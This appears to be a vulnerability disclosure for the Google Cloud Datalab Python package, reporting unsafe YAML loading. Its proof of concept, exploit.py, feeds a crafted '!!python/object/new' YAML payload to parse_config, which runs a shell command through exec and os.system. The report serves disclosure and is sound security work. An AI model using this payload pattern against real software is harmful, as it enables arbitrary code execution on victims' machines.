# Description

Google Cloud Datalab Python package. Used in Google Cloud Datalab and can be used in Jupyter Notebook.
This adds a number of Python modules such as google.datalab.bigquery, google.datalab.storage, etc, for accessing Google Cloud Platform services as well as adding some new cell magics such as %chart, %bigquery, %storage, etc.
See https://github.com/googledatalab/notebooks for samples of using this package.

# Vulnerability discription

Vulnerable to yaml deserilisation attack caused by unsafe loading.
# Proof of Concept
1. run exploit.py using ipython or jupyter notepad
```python
# exploit.py
import os
os.system('pip install datalab')
import datalab.utils.commands._utils as _utils 
exploit = '''!!python/object/new:type
  args: ["z", !!python/tuple [], {"extend": !!python/name:exec }]
  listitems: "__import__('os').system('xcalc')"
'''
_utils.parse_config(exploit ,None)
```
* running exploit through native python3/puthon2 causes error as the datalab is intended to run in jupyter notebook / ipython3/ipython 

![](https://cdn.discordapp.com/attachments/789769803770494996/791656913799872532/Screenshot_from_2020-12-24_18-41-16.png)
![](https://cdn.discordapp.com/attachments/789769803770494996/791656941586874398/Screenshot_from_2020-12-24_18-39-43.png)
